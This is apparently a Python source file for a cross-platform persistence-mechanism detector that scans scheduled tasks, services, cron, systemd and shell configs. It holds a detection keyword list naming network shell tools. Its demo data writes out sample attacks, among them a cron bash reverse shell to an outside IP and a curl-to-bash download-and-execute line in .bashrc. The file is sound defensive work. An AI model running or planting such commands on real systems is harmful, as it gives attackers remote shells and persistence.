"""
Persistence Mechanism Monitor
Cross-platform detection of persistence mechanisms including
autoruns, scheduled tasks, cron jobs, services, and startup items.
"""

import platform
import subprocess
import os
from datetime import datetime


class PersistenceMonitor:
    """Cross-platform persistence mechanism detector."""

    def __init__(self):
        self.os_type = platform.system().lower()

    def scan(self):
        """Scan for persistence mechanisms using the endpoint collector."""
        from modules.collector import EndpointCollector
        collector = EndpointCollector()

        findings = []
        mechanisms = []

        if self.os_type == 'windows':
            # Collect via collector, then analyze
            raw_tasks = collector.collect_windows_scheduled_tasks()
            mechanisms.extend(self._analyze_scheduled_tasks(raw_tasks))

            raw_services = collector.collect_windows_services()
            mechanisms.extend(self._analyze_services(raw_services))

            raw_startup = collector.collect_windows_startup_items()
            mechanisms.extend(self._analyze_startup_items(raw_startup))

        elif self.os_type == 'linux':
            raw_cron = collector.collect_linux_cron_jobs()
            mechanisms.extend(self._analyze_cron_jobs(raw_cron))

            raw_systemd = collector.collect_linux_systemd_services()
            mechanisms.extend(self._analyze_systemd_services(raw_systemd))

            raw_shells = collector.collect_linux_shell_configs()
            mechanisms.extend(self._analyze_shell_configs(raw_shells))

            mechanisms.extend(self._scan_linux_init_scripts())

        # Extract findings from suspicious mechanisms
        for mech in mechanisms:
            if mech.get('suspicious'):
                findings.append(mech['finding'])

        return {
            'mechanisms': mechanisms,
            'findings': findings,
            'mechanism_count': len(mechanisms),
            'findings_count': len(findings),
            'scan_time': datetime.now().isoformat(),
            'os': self.os_type,
            'summary': self._build_summary(findings)
        }

    # ──────────────────────────────────────────────
    # COLLECTOR-BASED ANALYSIS METHODS
    # ──────────────────────────────────────────────

    def _analyze_scheduled_tasks(self, raw_tasks):
        """Analyze collected scheduled tasks for suspicious indicators."""
        mechanisms = []
        for task in raw_tasks:
            if task.get('error'):
                continue
            action = task.get('task_to_run', '') or task.get('action', '')
            suspicious = self._is_suspicious_value(action)
            entry = {
                'type': 'scheduled_task',
                'name': task.get('task_name', 'Unknown'),
                'action': action,
                'user': task.get('run_as_user', '') or task.get('user', 'Unknown'),
                'platform': 'windows',
                'suspicious': suspicious
            }
            if suspicious:
                entry['finding'] = {
                    'type': 'suspicious_scheduled_task',
                    'severity': 'high',
                    'message': f'Suspicious scheduled task: {entry["name"]}',
                    'mitre_id': 'T1053.005',
                    'mitre_name': 'Scheduled Task/Job: Scheduled Task',
                    'details': f'Action: {action[:300]} | User: {entry["user"]}'
                }
            mechanisms.append(entry)
        return mechanisms

    def _analyze_services(self, raw_services):
        """Analyze collected Windows services for suspicious indicators."""
        mechanisms = []
        for svc in raw_services:
            svc_path = svc.get('path', '') or svc.get('PathName', '')
            suspicious = self._is_suspicious_value(svc_path)
            entry = {
                'type': 'service',
                'name': svc.get('name', '') or svc.get('Name', ''),
                'display_name': svc.get('display_name', ''),
                'path': svc_path,
                'start_mode': svc.get('start_mode', '') or svc.get('StartMode', ''),
                'state': svc.get('state', '') or svc.get('State', ''),
                'platform': 'windows',
                'suspicious': suspicious
            }
            if suspicious:
                entry['finding'] = {
                    'type': 'suspicious_service',
                    'severity': 'high',
                    'message': f'Suspicious service: {entry["name"]}',
                    'mitre_id': 'T1543.003',
                    'mitre_name': 'Create or Modify System Process: Windows Service',
                    'details': f'Path: {svc_path[:300]} | Start: {entry["start_mode"]} | State: {entry["state"]}'
                }
            mechanisms.append(entry)
        return mechanisms

    def _analyze_startup_items(self, raw_items):
        """Analyze collected startup folder items for suspicious indicators."""
        mechanisms = []
        suspicious_exts = ['.bat', '.cmd', '.ps1', '.vbs', '.js', '.exe', '.hta', '.wsf']
        for item in raw_items:
            ext = item.get('extension', '')
            suspicious = ext in suspicious_exts or self._is_suspicious_value(item.get('name', ''))
            entry = {
                'type': 'startup_folder',
                'name': item.get('name', 'Unknown'),
                'path': item.get('path', ''),
                'platform': 'windows',
                'suspicious': suspicious
            }
            if suspicious:
                entry['finding'] = {
                    'type': 'suspicious_startup_item',
                    'severity': 'high',
                    'message': f'Suspicious file in startup folder: {entry["name"]}',
                    'mitre_id': 'T1547.001',
                    'mitre_name': 'Boot or Logon Autostart Execution: Startup Folder',
                    'details': f'Path: {entry["path"]} | Extension: {ext}'
                }
            mechanisms.append(entry)
        return mechanisms

    def _analyze_cron_jobs(self, raw_cron):
        """Analyze collected cron jobs for suspicious indicators."""
        mechanisms = []
        for cron in raw_cron:
            if cron.get('error'):
                continue
            content = cron.get('content', '')
            suspicious = self._is_suspicious_value(content)
            entry = {
                'type': 'cron_job',
                'source': cron.get('source', 'Unknown'),
                'content': content,
                'platform': 'linux',
                'suspicious': suspicious
            }
            if suspicious:
                entry['finding'] = {
                    'type': 'suspicious_cron_job',
                    'severity': 'high',
                    'message': f'Suspicious cron entry in {cron.get("source", "Unknown")}',
                    'mitre_id': 'T1053.003',
                    'mitre_name': 'Scheduled Task/Job: Cron',
                    'details': f'Content: {content[:300]}'
                }
            mechanisms.append(entry)
        return mechanisms

    def _analyze_systemd_services(self, raw_services):
        """Analyze collected systemd services for suspicious indicators."""
        mechanisms = []
        for svc in raw_services:
            exec_start = svc.get('exec_start', 'N/A')
            suspicious = self._is_suspicious_value(exec_start) if exec_start != 'N/A' else False
            entry = {
                'type': 'systemd_service',
                'name': svc.get('name', 'Unknown'),
                'state': svc.get('state', 'Unknown'),
                'exec_start': exec_start,
                'platform': 'linux',
                'suspicious': suspicious
            }
            if suspicious:
                entry['finding'] = {
                    'type': 'suspicious_systemd_service',
                    'severity': 'high',
                    'message': f'Suspicious systemd service: {entry["name"]}',
                    'mitre_id': 'T1543.002',
                    'mitre_name': 'Create or Modify System Process: Systemd Service',
                    'details': f'ExecStart: {exec_start[:300]} | State: {entry["state"]}'
                }
            mechanisms.append(entry)
        return mechanisms

    def _analyze_shell_configs(self, raw_configs):
        """Analyze collected shell configs for suspicious indicators."""
        mechanisms = []
        for config in raw_configs:
            if not config.get('readable'):
                continue
            suspicious_lines = []
            for line_entry in config.get('lines', []):
                content = line_entry.get('content', '')
                if self._is_suspicious_value(content):
                    suspicious_lines.append(content)

            if suspicious_lines:
                entry = {
                    'type': 'shell_config',
                    'source': config.get('file', 'Unknown'),
                    'suspicious_lines': suspicious_lines,
                    'platform': 'linux',
                    'suspicious': True,
                    'finding': {
                        'type': 'suspicious_shell_config',
                        'severity': 'medium',
                        'message': f'Suspicious entries in {config.get("file", "Unknown")}',
                        'mitre_id': 'T1546.004',
                        'mitre_name': 'Event Triggered Execution: Unix Shell Configuration Modification',
                        'details': f'Lines: {"; ".join(suspicious_lines[:3])}'
                    }
                }
                mechanisms.append(entry)
            else:
                mechanisms.append({
                    'type': 'shell_config',
                    'source': config.get('file', 'Unknown'),
                    'platform': 'linux',
                    'suspicious': False
                })
        return mechanisms

    # ──────────────────────────────────────────────
    # WINDOWS SCANNERS (legacy fallback)
    # ──────────────────────────────────────────────

    def _scan_windows_scheduled_tasks(self):
        """Enumerate Windows scheduled tasks."""
        mechanisms = []
        try:
            result = subprocess.run(
                ['schtasks', '/query', '/fo', 'CSV', '/v'],
                capture_output=True, text=True, timeout=30
            )
            if result.returncode == 0:
                lines = result.stdout.strip().split('\n')
                for line in lines[1:]:  # Skip header
                    parts = line.strip('"').split('","')
                    if len(parts) >= 9:
                        task_name = parts[1] if len(parts) > 1 else 'Unknown'
                        task_action = parts[8] if len(parts) > 8 else 'Unknown'
                        task_user = parts[7] if len(parts) > 7 else 'Unknown'

                        suspicious = self._is_suspicious_value(task_action)
                        entry = {
                            'type': 'scheduled_task',
                            'name': task_name,
                            'action': task_action,
                            'user': task_user,
                            'platform': 'windows',
                            'suspicious': suspicious
                        }
                        if suspicious:
                            entry['finding'] = {
                                'type': 'suspicious_scheduled_task',
                                'severity': 'high',
                                'message': f'Suspicious scheduled task: {task_name}',
                                'mitre_id': 'T1053.005',
                                'mitre_name': 'Scheduled Task/Job: Scheduled Task',
                                'details': f'Action: {task_action} | User: {task_user}'
                            }
                        mechanisms.append(entry)
        except (subprocess.TimeoutExpired, FileNotFoundError, Exception):
            pass
        return mechanisms

    def _scan_windows_services(self):
        """Enumerate Windows services and flag suspicious ones."""
        mechanisms = []
        try:
            result = subprocess.run(
                ['wmic', 'service', 'get', 'Name,PathName,StartMode,State', '/format:csv'],
                capture_output=True, text=True, timeout=30
            )
            if result.returncode == 0:
                lines = result.stdout.strip().split('\n')
                for line in lines[1:]:
                    parts = line.strip().split(',')
                    if len(parts) >= 5:
                        svc_name = parts[1]
                        svc_path = parts[2]
                        svc_start = parts[3]
                        svc_state = parts[4]

                        suspicious = self._is_suspicious_value(svc_path)
                        entry = {
                            'type': 'service',
                            'name': svc_name,
                            'path': svc_path,
                            'start_mode': svc_start,
                            'state': svc_state,
                            'platform': 'windows',
                            'suspicious': suspicious
                        }
                        if suspicious:
                            entry['finding'] = {
                                'type': 'suspicious_service',
                                'severity': 'high',
                                'message': f'Suspicious service detected: {svc_name}',
                                'mitre_id': 'T1543.003',
                                'mitre_name': 'Create or Modify System Process: Windows Service',
                                'details': f'Path: {svc_path} | Start: {svc_start} | State: {svc_state}'
                            }
                        mechanisms.append(entry)
        except (subprocess.TimeoutExpired, FileNotFoundError, Exception):
            pass
        return mechanisms

    def _scan_windows_startup_folders(self):
        """Check Windows startup folders for suspicious entries."""
        mechanisms = []
        startup_paths = [
            os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup'),
            os.path.expandvars(r'%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup'),
        ]

        for startup_dir in startup_paths:
            if os.path.exists(startup_dir):
                for item in os.listdir(startup_dir):
                    filepath = os.path.join(startup_dir, item)
                    ext = os.path.splitext(item)[1].lower()
                    suspicious = ext in ['.bat', '.cmd', '.ps1', '.vbs', '.js', '.exe', '.hta']

                    entry = {
                        'type': 'startup_folder',
                        'name': item,
                        'path': filepath,
                        'platform': 'windows',
                        'suspicious': suspicious
                    }
                    if suspicious:
                        entry['finding'] = {
                            'type': 'suspicious_startup_item',
                            'severity': 'high',
                            'message': f'Suspicious file in startup folder: {item}',
                            'mitre_id': 'T1547.001',
                            'mitre_name': 'Boot or Logon Autostart Execution: Startup Folder',
                            'details': f'Path: {filepath} | Extension: {ext}'
                        }
                    mechanisms.append(entry)
        return mechanisms

    # ──────────────────────────────────────────────
    # LINUX SCANNERS
    # ──────────────────────────────────────────────

    def _scan_linux_cron_jobs(self):
        """Enumerate cron jobs — system and user-level."""
        mechanisms = []
        cron_locations = [
            '/etc/crontab',
            '/etc/cron.d/',
            '/var/spool/cron/crontabs/',
            '/var/spool/cron/',
        ]

        # System crontab
        if os.path.exists('/etc/crontab'):
            try:
                with open('/etc/crontab', 'r') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            suspicious = self._is_suspicious_value(line)
                            entry = {
                                'type': 'cron_job',
                                'source': '/etc/crontab',
                                'content': line,
                                'platform': 'linux',
                                'suspicious': suspicious
                            }
                            if suspicious:
                                entry['finding'] = {
                                    'type': 'suspicious_cron_job',
                                    'severity': 'high',
                                    'message': f'Suspicious entry in /etc/crontab',
                                    'mitre_id': 'T1053.003',
                                    'mitre_name': 'Scheduled Task/Job: Cron',
                                    'details': f'Content: {line[:200]}'
                                }
                            mechanisms.append(entry)
            except PermissionError:
                pass

        # Cron.d directory
        cron_d = '/etc/cron.d/'
        if os.path.exists(cron_d):
            for cron_file in os.listdir(cron_d):
                filepath = os.path.join(cron_d, cron_file)
                try:
                    with open(filepath, 'r') as f:
                        for line in f:
                            line = line.strip()
                            if line and not line.startswith('#'):
                                suspicious = self._is_suspicious_value(line)
                                entry = {
                                    'type': 'cron_job',
                                    'source': filepath,
                                    'content': line,
                                    'platform': 'linux',
                                    'suspicious': suspicious
                                }
                                if suspicious:
                                    entry['finding'] = {
                                        'type': 'suspicious_cron_job',
                                        'severity': 'high',
                                        'message': f'Suspicious entry in {filepath}',
                                        'mitre_id': 'T1053.003',
                                        'mitre_name': 'Scheduled Task/Job: Cron',
                                        'details': f'Content: {line[:200]}'
                                    }
                                mechanisms.append(entry)
                except PermissionError:
                    pass

        # User crontabs
        try:
            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                for line in result.stdout.strip().split('\n'):
                    line = line.strip()
                    if line and not line.startswith('#'):
                        suspicious = self._is_suspicious_value(line)
                        entry = {
                            'type': 'user_cron_job',
                            'source': 'current user crontab',
                            'content': line,
                            'platform': 'linux',
                            'suspicious': suspicious
                        }
                        if suspicious:
                            entry['finding'] = {
                                'type': 'suspicious_cron_job',
                                'severity': 'high',
                                'message': 'Suspicious entry in user crontab',
                                'mitre_id': 'T1053.003',
                                'mitre_name': 'Scheduled Task/Job: Cron',
                                'details': f'Content: {line[:200]}'
                            }
                        mechanisms.append(entry)
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass

        return mechanisms

    def _scan_linux_systemd_services(self):
        """Enumerate systemd services and flag suspicious ones."""
        mechanisms = []
        try:
            result = subprocess.run(
                ['systemctl', 'list-unit-files', '--type=service', '--no-pager'],
                capture_output=True, text=True, timeout=15
            )
            if result.returncode == 0:
                lines = result.stdout.strip().split('\n')
                for line in lines[1:]:
                    parts = line.split()
                    if len(parts) >= 2 and parts[0].endswith('.service'):
                        svc_name = parts[0]
                        svc_state = parts[1]

                        # Check the service unit file for suspicious ExecStart
                        exec_start = self._get_systemd_exec(svc_name)
                        suspicious = self._is_suspicious_value(exec_start) if exec_start else False

                        entry = {
                            'type': 'systemd_service',
                            'name': svc_name,
                            'state': svc_state,
                            'exec_start': exec_start or 'N/A',
                            'platform': 'linux',
                            'suspicious': suspicious
                        }
                        if suspicious:
                            entry['finding'] = {
                                'type': 'suspicious_systemd_service',
                                'severity': 'high',
                                'message': f'Suspicious systemd service: {svc_name}',
                                'mitre_id': 'T1543.002',
                                'mitre_name': 'Create or Modify System Process: Systemd Service',
                                'details': f'ExecStart: {exec_start} | State: {svc_state}'
                            }
                        mechanisms.append(entry)
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
        return mechanisms

    def _get_systemd_exec(self, service_name):
        """Get the ExecStart value from a systemd unit file."""
        try:
            result = subprocess.run(
                ['systemctl', 'show', service_name, '--property=ExecStart'],
                capture_output=True, text=True, timeout=5
            )
            if result.returncode == 0:
                output = result.stdout.strip()
                if '=' in output:
                    return output.split('=', 1)[1]
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
        return None

    def _scan_linux_shell_configs(self):
        """Check shell configuration files for persistence."""
        mechanisms = []
        shell_configs = [
            os.path.expanduser('~/.bashrc'),
            os.path.expanduser('~/.bash_profile'),
            os.path.expanduser('~/.profile'),
            os.path.expanduser('~/.zshrc'),
            '/etc/profile',
            '/etc/bash.bashrc',
        ]

        for config_file in shell_configs:
            if os.path.exists(config_file):
                try:
                    with open(config_file, 'r') as f:
                        content = f.read()
                        suspicious_lines = []
                        for line in content.split('\n'):
                            line = line.strip()
                            if line and not line.startswith('#'):
                                if self._is_suspicious_value(line):
                                    suspicious_lines.append(line)

                        if suspicious_lines:
                            entry = {
                                'type': 'shell_config',
                                'source': config_file,
                                'suspicious_lines': suspicious_lines,
                                'platform': 'linux',
                                'suspicious': True,
                                'finding': {
                                    'type': 'suspicious_shell_config',
                                    'severity': 'medium',
                                    'message': f'Suspicious entries in {config_file}',
                                    'mitre_id': 'T1546.004',
                                    'mitre_name': 'Event Triggered Execution: Unix Shell Configuration Modification',
                                    'details': f'Lines: {"; ".join(suspicious_lines[:3])}'
                                }
                            }
                            mechanisms.append(entry)
                        else:
                            mechanisms.append({
                                'type': 'shell_config',
                                'source': config_file,
                                'platform': 'linux',
                                'suspicious': False
                            })
                except PermissionError:
                    pass
        return mechanisms

    def _scan_linux_init_scripts(self):
        """Check rc.local and init.d for persistence."""
        mechanisms = []
        init_paths = ['/etc/rc.local', '/etc/init.d/']

        if os.path.exists('/etc/rc.local'):
            try:
                with open('/etc/rc.local', 'r') as f:
                    content = f.read()
                    suspicious = self._is_suspicious_value(content)
                    entry = {
                        'type': 'rc_local',
                        'source': '/etc/rc.local',
                        'content_preview': content[:500],
                        'platform': 'linux',
                        'suspicious': suspicious
                    }
                    if suspicious:
                        entry['finding'] = {
                            'type': 'suspicious_init_script',
                            'severity': 'high',
                            'message': 'Suspicious content in /etc/rc.local',
                            'mitre_id': 'T1037.004',
                            'mitre_name': 'Boot or Logon Initialization Scripts: RC Scripts',
                            'details': f'Content: {content[:200]}'
                        }
                    mechanisms.append(entry)
            except PermissionError:
                pass

        return mechanisms

    # ──────────────────────────────────────────────
    # SHARED UTILITIES
    # ──────────────────────────────────────────────

    def _is_suspicious_value(self, value):
        """Check if a value contains suspicious patterns."""
        if not value:
            return False
        value_lower = value.lower()
        suspicious_indicators = [
            'powershell', 'cmd /c', 'bash -c', '/bin/sh -c',
            'curl ', 'wget ', 'base64', 'python -c',
            '/tmp/', '/dev/shm/', 'nc -', 'ncat ',
            '-enc ', '-nop ', 'downloadstring', 'invoke-expression',
            'hidden', 'bypass', 'unrestricted',
            r'\public\\', r'\temp\\', r'\downloads\\',
            'reverse', 'shell', 'meterpreter', 'payload',
        ]
        return any(indicator in value_lower for indicator in suspicious_indicators)

    def _build_summary(self, findings):
        summary = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0, 'info': 0}
        for f in findings:
            sev = f.get('severity', 'info')
            if sev in summary:
                summary[sev] += 1
        return summary

    def get_demo_data(self):
        """Return realistic simulated persistence data for portfolio demos."""
        demo_mechanisms = [
            # Legitimate Windows entries
            {
                'type': 'scheduled_task',
                'name': r'\Microsoft\Windows\WindowsUpdate\Scheduled Start',
                'action': r'%systemroot%\system32\sc.exe start wuauserv',
                'user': 'SYSTEM', 'platform': 'windows', 'suspicious': False
            },
            {
                'type': 'service',
                'name': 'Windows Defender',
                'path': r'"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2302.7-0\MsMpEng.exe"',
                'start_mode': 'Auto', 'state': 'Running',
                'platform': 'windows', 'suspicious': False
            },
            # Legitimate Linux entries
            {
                'type': 'systemd_service',
                'name': 'sshd.service',
                'state': 'enabled',
                'exec_start': '/usr/sbin/sshd -D',
                'platform': 'linux', 'suspicious': False
            },
            {
                'type': 'cron_job',
                'source': '/etc/crontab',
                'content': '25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )',
                'platform': 'linux', 'suspicious': False
            },
            # ---- SUSPICIOUS ENTRIES ----
            {
                'type': 'scheduled_task',
                'name': r'\SystemHealthCheck',
                'action': r'powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAt...',
                'user': 'WORKSTATION-01\\analyst', 'platform': 'windows',
                'suspicious': True,
                'finding': {
                    'type': 'suspicious_scheduled_task',
                    'severity': 'critical',
                    'message': r'Suspicious scheduled task: \SystemHealthCheck',
                    'mitre_id': 'T1053.005',
                    'mitre_name': 'Scheduled Task/Job: Scheduled Task',
                    'details': 'Task runs encoded PowerShell with hidden window and no profile. Created by non-admin user.'
                }
            },
            {
                'type': 'service',
                'name': 'WindowsUpdateService',
                'path': r'C:\Users\Public\Downloads\svchost.exe -k netsvcs',
                'start_mode': 'Auto', 'state': 'Running',
                'platform': 'windows', 'suspicious': True,
                'finding': {
                    'type': 'suspicious_service',
                    'severity': 'high',
                    'message': 'Suspicious service: WindowsUpdateService',
                    'mitre_id': 'T1543.003',
                    'mitre_name': 'Create or Modify System Process: Windows Service',
                    'details': r'Service binary is C:\Users\Public\Downloads\svchost.exe — masquerading as svchost from non-standard path.'
                }
            },
            {
                'type': 'startup_folder',
                'name': 'updater.bat',
                'path': r'C:\Users\analyst\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\updater.bat',
                'platform': 'windows', 'suspicious': True,
                'finding': {
                    'type': 'suspicious_startup_item',
                    'severity': 'high',
                    'message': 'Suspicious batch file in user startup folder: updater.bat',
                    'mitre_id': 'T1547.001',
                    'mitre_name': 'Boot or Logon Autostart Execution: Startup Folder',
                    'details': 'Batch file in user startup folder. Executes at every user logon.'
                }
            },
            {
                'type': 'cron_job',
                'source': '/var/spool/cron/crontabs/www-data',
                'content': '*/5 * * * * /bin/bash -c "bash -i >& /dev/tcp/185.220.101.45/4444 0>&1"',
                'platform': 'linux', 'suspicious': True,
                'finding': {
                    'type': 'suspicious_cron_job',
                    'severity': 'critical',
                    'message': 'Reverse shell cron job detected in www-data crontab',
                    'mitre_id': 'T1053.003',
                    'mitre_name': 'Scheduled Task/Job: Cron',
                    'details': 'Bash reverse shell to 185.220.101.45:4444 running every 5 minutes. Classic persistence via cron.'
                }
            },
            {
                'type': 'shell_config',
                'source': '/home/user/.bashrc',
                'suspicious_lines': ['curl http://185.220.101.45/update.sh | bash'],
                'platform': 'linux', 'suspicious': True,
                'finding': {
                    'type': 'suspicious_shell_config',
                    'severity': 'high',
                    'message': 'Download-and-execute in .bashrc',
                    'mitre_id': 'T1546.004',
                    'mitre_name': 'Event Triggered Execution: Unix Shell Configuration Modification',
                    'details': 'curl piped to bash in .bashrc — executes every time user opens a terminal.'
                }
            },
        ]

        demo_findings = [m['finding'] for m in demo_mechanisms if m.get('suspicious')]

        return {
            'mechanisms': demo_mechanisms,
            'findings': demo_findings,
            'mechanism_count': len(demo_mechanisms),
            'findings_count': len(demo_findings),
            'scan_time': datetime.now().isoformat(),
            'os': 'cross-platform (demo)',
            'summary': {'critical': 2, 'high': 3, 'medium': 0, 'low': 0, 'info': 0}
        }
